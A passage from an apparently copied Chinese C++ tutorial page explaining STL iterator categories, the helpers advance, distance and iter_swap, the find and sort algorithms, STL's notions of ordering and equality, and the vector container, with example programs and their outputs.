class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后置<code>++</code>要多生成一个局部对象 tmp，因此执行速度比前置的慢。同理，迭代器是一个对象，<a href="http://c.biancheng.net/stl/">STL</a> 在重载迭代器的<code>++</code>运算符时，后置形式也比前置形式慢。在次数很多的循环中，<code>++i</code>和<code>i++</code>可能就会造成运行时间上可观的差别了。因此，本教程在前面特别提到，对循环控制变量i，要养成写<code>++i</code>、不写<code>i++</code>的习惯。</p>
<p>注意，容器适配器 stack、queue 和 priority_queue 没有迭代器。容器适配器有一些成员函数，可以用来对元素进行访问。</p>
<p><strong>迭代器的功能分类</strong></p>
<p>不同容器的迭代器，其功能强弱有所不同。容器的迭代器的功能强弱，决定了该容器是否支持 STL 中的某种算法。例如，排序算法需要通过随机访问迭代器来访问容器中的元素，因此有的容器就不支持排序算法。</p>
<p>常用的迭代器按功能强弱分为输入、输出、正向、双向、随机访问五种，这里只介绍常用的三种。</p>
<p>1) 正向迭代器。假设 p 是一个正向迭代器，则 p 支持以下操作：++p，p++，*p。此外，两个正向迭代器可以互相赋值，还可以用<code>==</code>和<code>!=</code>运算符进行比较。</p>
<p>2) 双向迭代器。双向迭代器具有正向迭代器的全部功能。除此之外，若 p 是一个双向迭代器，则<code>--p</code>和<code>p--</code>都是有定义的。<code>--p</code>使得 p 朝和<code>++p</code>相反的方向移动。</p>
<p>3) 随机访问迭代器。随机访问迭代器具有双向迭代器的全部功能。若 p 是一个随机访问迭代器，i 是一个整型变量或常量，则 p 还支持以下操作：</p>
<ul>
<li>p+=i：使得 p 往后移动 i 个元素。</li>
<li>p-=i：使得 p 往前移动 i 个元素。</li>
<li>p+i：返回 p 后面第 i 个元素的迭代器。</li>
<li>p-i：返回 p 前面第 i 个元素的迭代器。</li>
<li>p[i]：返回 p 后面第 i 个元素的引用。</li>
</ul>
<p>此外，两个随机访问迭代器 p1、p2 还可以用 &lt;、&gt;、&lt;=、&gt;= 运算符进行比较。<code>p1&lt;p2</code>的含义是：p1 经过若干次（至少一次）<code>++</code>操作后，就会等于 p2。其他比较方式的含义与此类似。</p>
<p>对于两个随机访问迭代器 p1、p2，表达式<code>p2-p1</code>也是有定义的，其返回值是 p2 所指向元素和 p1 所指向元素的序号之差（也可以说是 p2 和 p1 之间的元素个数减一）。</p>
<p>表1所示为不同容器的迭代器的功能。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>容器</th>
<th>迭代器功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>vector</td>
<td>随机访问</td>
</tr>
<tr>
<td>deque</td>
<td>随机访问</td>
</tr>
<tr>
<td>list</td>
<td>双向</td>
</tr>
<tr>
<td>set / multiset</td>
<td>双向</td>
</tr>
<tr>
<td>map / multimap</td>
<td>双向</td>
</tr>
<tr>
<td>stack</td>
<td>不支持迭代器</td>
</tr>
<tr>
<td>queue</td>
<td>不支持迭代器</td>
</tr>
<tr>
<td>priority_queue</td>
<td>不支持迭代器</td>
</tr>
</tbody>
</table>
</div>
<p>例如，vector 的迭代器是随机迭代器，因此遍历 vector 容器有以下几种做法。下面的程序中，每个循环演示了一种做法。</p>
<p>【实例】遍历 vector 容器。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span><span class="params">(<span class="number">100</span>)</span></span>; <span class="comment">//v被初始化成有100个元素</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; v.size() ; ++i) <span class="comment">//size返回元素个数</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; v[i]; <span class="comment">//像普通数组一样使用vector容器</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator i;</span><br><span class="line">    <span class="keyword">for</span>(i = v.begin(); i != v.end (); ++i) <span class="comment">//用 != 比较两个迭代器</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * i;</span><br><span class="line">    <span class="keyword">for</span>(i = v.begin(); i &lt; v.end ();++i) <span class="comment">//用 &lt; 比较两个迭代器</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * i;</span><br><span class="line">    i = v.begin();</span><br><span class="line">    <span class="keyword">while</span>(i &lt; v.end()) &#123; <span class="comment">//间隔一个输出</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * i;</span><br><span class="line">        i += <span class="number">2</span>; <span class="comment">// 随机访问迭代器支持 &quot;+= 整数&quot;  的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>list 容器的迭代器是双向迭代器。假设 v 和 i 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::const_iterator i;</span><br></pre></td></tr></table></figure>
<p>则以下代码是合法的：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=v.begin(); i!=v.end(); ++i)</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; *i;</span><br></pre></td></tr></table></figure>
<p>以下代码则不合法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=v.begin(); i&lt;v.end(); ++i)</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; *i;</span><br></pre></td></tr></table></figure>
<p>因为双向迭代器不支持用“&lt;”进行比较。以下代码也不合法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;v.size(); ++i)</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v[i];</span><br></pre></td></tr></table></figure>
<p>因为 list 不支持随机访问迭代器的容器，也不支持用下标随机访问其元素。</p>
<p>在 <a href="http://c.biancheng.net/cplus/">C++</a> 中，数组也是容器。数组的迭代器就是指针，而且是随机访问迭代器。例如，对于数组 int a[10]，int * 类型的指针就是其迭代器。则 a、a+1、a+2 都是 a 的迭代器。</p>
<p><strong>迭代器的辅助函数</strong></p>
<p>STL 中有用于操作迭代器的三个函数模板，它们是：</p>
<ul>
<li>advance(p, n)：使迭代器 p 向前或向后移动 n 个元素。</li>
<li>dis<a href="http://c.biancheng.net/ref/tan.html">tan</a>ce(p, q)：计算两个迭代器之间的距离，即迭代器 p 经过多少次 + + 操作后和迭代器 q 相等。如果调用时 p 已经指向 q 的后面，则这个函数会陷入死循环。</li>
<li>iter_swap(p, q)：用于交换两个迭代器 p、q 指向的值。</li>
</ul>
<p>要使用上述模板，需要包含头文件 algorithm。下面的程序演示了这三个函数模板的 用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt; //要使用操作迭代器的函数模板，需要包含此文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line">    <span class="built_in">list</span> &lt;<span class="keyword">int</span>&gt; lst(a, a+<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">list</span> &lt;<span class="keyword">int</span>&gt;::iterator p = lst.begin();</span><br><span class="line">    advance(p, <span class="number">2</span>);  <span class="comment">//p向后移动两个元素，指向3</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1)&quot;</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 1)3</span></span><br><span class="line">    advance(p, <span class="number">-1</span>);  <span class="comment">//p向前移动一个元素，指向2</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 2)2</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator q = lst.end();</span><br><span class="line">    q--;  <span class="comment">//q 指向 5</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span> &lt;&lt; distance(p, q) &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 3)3</span></span><br><span class="line">    iter_swap(p, q); <span class="comment">//交换 2 和 5</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (p = lst.begin(); p != lst.end(); ++p)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的输出结果是：<br>1) 3<br>2) 2<br>3) 3<br>4) 1 5 3 4 2</p>
<h4 id="STL算法详解"><a href="#STL算法详解" class="headerlink" title="STL算法详解"></a>STL算法详解</h4><p><a href="http://c.biancheng.net/stl/">STL</a> 提供能在各种容器中通用的算法（大约有70种），如插入、删除、查找、排序等。算法就是函数模板。算法通过迭代器来操纵容器中的元素。</p>
<p>许多算法操作的是容器上的一个区间（也可以是整个容器），因此需要两个参数，一个是区间起点元素的迭代器，另一个是区间终点元素的后面一个元素的迭代器。例如，排序和查找算法都需要这两个参数来指明待排序或待查找的区间。</p>
<p>有的算法返回一个迭代器。例如，find 算法在容器中查找一个元素，并返回一个指向该元素的迭代器。</p>
<p>算法可以处理容器，也可以处理普通的数组。</p>
<p>有的算法会改变其所作用的容器。例如：</p>
<ul>
<li>copy：将一个容器的内容复制到另一个容器。</li>
<li>remove：在容器中删除一个元素。</li>
<li>random_shuffle：随机打乱容器中的元素。</li>
<li>fill：用某个值填充容器。</li>
</ul>
<p>有的算法不会改变其所作用的容器。例如：</p>
<ul>
<li>find：在容器中查找元素。</li>
<li>count_if：统计容器中符合某种条件的元素的个数。</li>
</ul>
<p>STL 中的大部分常用算法都在头文件 algorithm 中定义。此外，头文件 numeric 中也有一些算法。</p>
<p>下面介绍一个常用算法 find，以便对算法是什么、怎么用有一个基本的概念。find 算法和其他算法一样都是函数模板。find 模板的原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">InIt</span>, <span class="title">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">InIt</span> <span class="title">find</span>(<span class="title">InIt</span> <span class="title">first</span>, <span class="title">InIt</span> <span class="title">last</span>, <span class="title">const</span> <span class="title">T</span>&amp; <span class="title">val</span>);</span></span><br></pre></td></tr></table></figure>
<p>其功能可以是在迭代器 first、last 指定的容器的一个区间 [first, last) 中，按顺序查找和 val 相等的元素。如果找到，就返回该元素的迭代器；如果找不到，就返回 last。</p>
<blockquote>
<p>[first, last) 这个区间是一个左闭右开的区间，即 last 指向的元素其实不在此区间内。</p>
</blockquote>
<p>find 模板使用<code>==</code>运算符判断元素是否相等。因此，如果 [first, last) 区间中存放的是对象，则<code>==</code>运算符应该被适当重载，使得两个对象可以用<code>==</code>运算符比较。</p>
<p>注意：上一段话说的是“其功能可以是”，而不是“其功能就是”。这是因为模板只是一种代码形式，这种代码形式具体能完成什么功能，取决于程序员对该模板写法的了解及其想象力。按照语法，调用 find 模板时，first 和 last 只要类型相同就可以，不一定必须是迭代器。</p>
<p>演示 find 用法的程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>] = &#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">    v.push_back(<span class="number">1</span>);    v.push_back(<span class="number">2</span>);</span><br><span class="line">    v.push_back(<span class="number">3</span>);    v.push_back(<span class="number">4</span>); <span class="comment">//此后v里放着4个元素：1,2,3,4</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator p;</span><br><span class="line">    p = find(v.begin(),v.end(),<span class="number">3</span>); <span class="comment">//在v中查找3</span></span><br><span class="line">    <span class="keyword">if</span>(p != v.end()) <span class="comment">//若找不到,find返回 v.end()</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span> &lt;&lt;  * p &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//找到了</span></span><br><span class="line">    p = find(v.begin(),v.end(),<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">if</span>(p == v.end())</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;not found &quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//没找到</span></span><br><span class="line">    p = find(v.begin()+<span class="number">1</span>,v.end()<span class="number">-1</span>,<span class="number">4</span>); <span class="comment">//在,3 这两个元素中查找4</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2) &quot;</span> &lt;&lt; * p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> * pp = find(a,a+<span class="number">4</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">if</span>(pp == a + <span class="number">4</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;not found&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3) &quot;</span> &lt;&lt;* pp &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的输出结果是：<br>1) 3<br>not found<br>2) 4<br>3) 20</p>
<p>第 11 行，要查找的区间是 [v.begin(), v.end( ))，v.end() 不在查找范围内，因此没有问题。本行的查找会成功，因此 p 指向找到的元素 3。</p>
<p>第 17 行，因为要查找的区间是 [v.begin()+l，v.end()-1)，这个区间中只有 2、3 这两个元素，因此查找会失败，p 的值变为 v.end() - 1，因此 p 正好指向 4 这个元素。</p>
<p>第 19 行，数组 a 是一个容器。数组名 a 的类型是 int <em>，可以做迭代器使用，表达式<code>a+4</code>的类型也是 int</em>，因此也能做迭代器。本次调用 find,查找区间是 [a, a+4)，即数组 a 的前 4 个元素。如果查找失败，find 就会返回 a+4。</p>
<p>STL 中还有一个常用的算法 sort，用于对容器排序，其原型为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;class_RandIt&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(_RandIt first, _RandIt last)</span></span>;</span><br></pre></td></tr></table></figure>
<p>该算法可以用来对区间 [first, last) 从小到大进行排序。下面两行程序就能对数组 a 排序：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">4</span>] = &#123;<span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">sort(a, a+<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<h4 id="STL中-”大“、”小“-和-”相等“-的概念"><a href="#STL中-”大“、”小“-和-”相等“-的概念" class="headerlink" title="STL中 ”大“、”小“ 和 ”相等“ 的概念"></a>STL中 ”大“、”小“ 和 ”相等“ 的概念</h4><p><a href="http://c.biancheng.net/stl/">STL</a> 中关联容器内部的元素是排序的。STL 中的许多算法也涉及排序、查找。这些容器和算法都需要对元素进行比较，有的比较是否相等，有的比较元素大小。</p>
<p>在 STL 中，默认情况下，比较大小是通过<code>&lt;</code>运算符进行的，和<code>&gt;</code>运算符无关。在STL中提到“大”、“小”的概念时，以下三个说法是等价的：</p>
<ul>
<li>x 比 y 小。</li>
<li>表达式<code>x&lt;y</code>为真。</li>
<li>y 比 x 大。</li>
</ul>
<p>一定要注意，<code>y比x大</code>意味着<code>x&lt;y为真</code>，而不是<code>y&gt;x为真</code>。<code>y&gt;x</code>的结果如何并不重要，甚至<code>y&gt;x</code>是没定义的都没有关系。</p>
<p>在 STL 中，<code>x和y相等</code>也往往不等价于<code>x==y为真</code>。对于在未排序的区间上进行的算法，如顺序查找算法 find，查找过程中比较两个元素是否相等用的是<code>==</code>运算符；但是对于在排好序的区间上进行查找、合并等操作的算法（如折半查找算法 binary_search，关联容器自身的成员函数 find）来说，<code>x和y相等</code>是与<code>x&lt;y和y&lt;x同时为假</code>等价的，与<code>==</code>运算符无关。看上去<code>x&lt;y和y&lt;x同时为假</code>就应该和<code>x==y为真</code>等价，其实不然。例如下面的 class A：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt; (<span class="keyword">const</span> A &amp; a)<span class="keyword">const</span> &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，对任意两个类 A 的对象 x、y，<code>x&lt;y</code>和<code>y&lt;x</code>都是为假的。也就是说，对 STL 的关联容器和许多算法来说，任意两个类 A 的对象都是相等的，这与<code>==</code>运算符的行为无关。</p>
<p>综上所述，使用 STL 中的关联容器和许多算法时，往往需要对<code>&lt;</code>运算符进行适当的重载，使得这些容器和算法可以用<code>&lt;</code>运算符对所操作的元素进行比较。最好将<code>&lt;</code>运算符重载为全局函数，因为在重载为成员函数时，在有些编译器上会出错（由其 STL 源代码的写法导致）。</p>
<h4 id="C-vector，STL-vector（可变长的动态数组）详解"><a href="#C-vector，STL-vector（可变长的动态数组）详解" class="headerlink" title="C++ vector，STL vector（可变长的动态数组）详解"></a>C++ vector，STL vector（可变长的动态数组）详解</h4><p>vector 是顺序容器的一种。vector 是可变长的动态数组，支持随机访问迭代器，所有 <a href="http://c.biancheng.net/stl/">STL</a> 算法都能对 vector 进行操作。要使用 vector，需要包含头文件 vector。</p>
<p>在 vector 容器中，根据下标随机访问某个元素的时间是常数，在尾部添加一个元素的时间大多数情况下也是常数，总体来说速度很快。</p>
<p>在中间插入或删除元素时，因为要移动多个元素，因此速度较慢，平均花费的时间和容器中的元素个数成正比。</p>
<p>在 vector 容器中，用一个动态分配的数组来存放元素，因此根据下标访问某个元素的时间是固定的，与元素个数无关。</p>
<p>vector 容器在实现时，动态分配的存储空间一般都大于存放元素所需的空间。例如，哪怕容器中只有一个元素，也会分配 32 个元素的存储空间。这样做的好处是，在尾部添加一个新元素时不必重新分配空间，直接将新元素写入适当位置即可。在这种情况下，添加新元素的时间也是常数。</p>
<p>但是，如果不断添加新元素，多出来的空间就会用完，此时再添加新元素，就不得不重新分配内存空间，把原有内容复制过去后再添加新的元素。碰到这种情况，添加新元素所花的时间就不是常数，而是和数组中的元素个数成正比。</p>
<p>至于在中间插入或删除元素，必然涉及元素的移动，因此时间不是固定的，而是和元素个数有关。</p>
<p>vector 有很多成员函数，常用的如表 1 所示。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>成员函数</th>
<th>作 用</th>
</tr>
</thead>
<tbody>
<tr>
<td>vector()</td>
<td>无参构造函数，将容器初始化为空</td>
</tr>
<tr>
<td>vector(int n)</td>
<td>将容器初始化为有 n 个元素</td>
</tr>
<tr>
<td>vector(int n, const T &amp; val)</td>
<td>假定元素的类型是 T，此构造函数将容器初始化为有 n 个元素，每 个元素的值都是 val</td>
</tr>
<tr>
<td>vector(iterator first, iterator last)</td>
<td>first 和 last 可以是其他容器的迭代器。一般来说，本构造函数初始化的结果就是将 vector 容器的内容变成与其他容器上的区间 [first, last) —致</td>
</tr>
<tr>
<td>void clear()</td>
<td>删除所有元素</td>
</tr>
<tr>
<td>bool empty()</td>
<td>判断容器是否为空</td>
</tr>
<tr>
<td>void pop_back()</td>
<td>删除容器末尾的元素</td>
</tr>
<tr>
<td>void push_back( const T &amp; val)</td>
<td>将 val 添加到容器末尾</td>
</tr>
<tr>
<td>int size()</td>
<td>返回容器中元素的个数</td>
</tr>
<tr>
<td>T &amp; front()</td>
<td>返回容器中第一个元素的引用</td>
</tr>
<tr>
<td>T &amp; back()</td>
<td>返回容器中最后一个元素的引用</td>
</tr>
<tr>
<td>iterator insert(iterator i, const T &amp; val)</td>
<td>将 val 插入迭代器 i 指向的位置，返回 i</td>
</tr>
<tr>
<td>iterator insert( iterator i, iterator first, iterator last)</td>
<td>将其他容器上的区间 [first, last) 中的元素插入迭代器 i 指向的位置</td>
</tr>
<tr>
<td>iterator erase(iterator i)</td>
<td>删除迭代器 i 指向的元素，返回值是被删元素后面的元素的迭代器</td>
</tr>
<tr>
<td>iterator erase(iterator first, iterator last)</td>
<td>删除容器中的区间 [first, last)</td>
</tr>
<tr>
<td>void swap( vector <T> &amp; v)</T></td>
<td>将容器自身的内容和另一个同类型的容器 v 互换</td>
</tr>
</tbody>
</table>
</div>
<p>下面的程序演示了 vector 的基本用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;  //使用vector需要包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">PrintVector</span>(<span class="title">const</span> <span class="title">vector</span> &lt;T&gt; &amp; <span class="title">v</span>)</span></span><br><span class="line"><span class="class">&#123;</span>  <span class="comment">//用于输出vector容器的全部元素的函数模板</span></span><br><span class="line">    <span class="keyword">typename</span> <span class="built_in">vector</span> &lt;T&gt;::const_iterator i;</span><br><span class="line">    <span class="comment">//typename 用来说明 vector &lt;T&gt;::const_iterator 是一个类型，在 Visual Studio 中不写也可以</span></span><br><span class="line">    <span class="keyword">for</span> (i = v.begin(); i != v.end(); ++i)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line">    <span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; v(a, a + <span class="number">5</span>);  <span class="comment">//将数组a的内容放入v</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span> &lt;&lt; v.end() - v.begin() &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//两个随机迭代器可以相减，输出：1)5</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span>; PrintVector(v);  <span class="comment">//输出：2)1 2 3 4 5</span></span><br><span class="line">    v.insert(v.begin() + <span class="number">2</span>, <span class="number">13</span>);  <span class="comment">//在 begin()+2 位置插人 13</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span>; PrintVector(v);  <span class="comment">//输出：3)1 2 13 3 4 5</span></span><br><span class="line">    v.erase(v.begin() + <span class="number">2</span>);  <span class="comment">//删除位于 begin()+2 位置的元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>; PrintVector(v);  <span class="comment">//输出：4)1 2 3 4 5</span></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v2</span><span class="params">(<span class="number">4</span>, <span class="number">100</span>)</span></span>;  <span class="comment">//v2 有 4 个元素，都是 100</span></span><br><span class="line">    v2.insert(v2.begin(), v.begin() + <span class="number">1</span>, v.begin() + <span class="number">3</span>);  <span class="comment">//将v的一段插入v2开头</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5)v2:&quot;</span>; PrintVector(v2);  <span class="comment">//输出：5)v2:2 3 100 100 100 100</span></span><br><span class="line">    v.erase(v.begin() + <span class="number">1</span>, v.begin() + <span class="number">3</span>);  <span class="comment">//删除 v 上的一个区间，即 [2,3)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6)&quot;</span>; PrintVector(v);  <span class="comment">//输出：6)1 4 5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思考题：程序中的 PrintVector 模板演示了将容器的引用作为函数参数的用法。就完成输出整个容器内容这个功能来说，写成 PrintVector 模板这样是比较笨拙的，该模板的适用范围太窄。有没有更好的写法？</p>
<p>vector 还可以嵌套以形成可变长的<a href="http://c.biancheng.net/c/array/">二维数组</a>。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; <span class="title">v</span><span class="params">(<span class="number">3</span>)</span></span>; <span class="comment">//v有3个元素，每个元素都是vector&lt;int&gt; 容器</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; v.size(); ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">            v[i].push_back(j);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; v.size(); ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; v[i].size(); ++j)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; v[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的输出结果是：<br>0 1 2 3<br>0 1 2 3<br>0 1 2 3</p>
<p><code>vector&lt; vector&lt;int&gt; &gt; v(3);</code>定义了一个 vector 容器，该容器中的每个元素都是一个 vector <int> 容器。即可以认为，v 是一个二维数组，一共 3 行，每行都是一个可变长的一维数组。</int></p>
<p>在 Dev <a href="http://c.biancheng.net/cplus/">C++</a> 中，上面写法中 int 后面的两个<code>&gt;</code>之间需要有空格，否则有的编译器会把它们当作<code>&gt;&gt;</code>运算符，编译会出错。</p>
<h4 id="C-list，STL-list（双向链表）详解"><a href="#C-list，STL-list（双向链表）详解" class="headerlink" title="C++ list，STL list（双向链表）详解"></a>C++ list，STL list（双向链表）详解</h4><p>list 是顺序容器的一种。list 是一个双向链表。使用 list 需要包含头文件 list。双向链表的每个元素中都有一个<a href="http://c.biancheng.net/c/80/">指针</a>指向后一个元素，也有一个指针指向前一个元素，如图1所示。</p>
